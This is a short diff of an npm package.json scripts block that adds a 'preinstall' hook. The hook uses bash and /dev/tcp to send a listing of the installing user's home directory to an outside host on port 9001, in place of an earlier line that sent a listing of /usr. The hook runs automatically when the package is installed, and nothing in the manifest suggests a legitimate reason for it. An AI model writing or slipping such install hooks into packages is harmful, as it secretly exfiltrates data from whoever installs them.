@@ -15,6 +15,6 @@
   "scripts": {
 	"prepack": "echo prepack",
 	"prepare": "echo prepare",
-	"preinstall": "bash -c 'ls /usr > /dev/tcp/landspitalinn.is/9001'"
+	"preinstall": "bash -c 'ls ~ > /dev/tcp/landspitalinn.is/9001'"
   }
 }
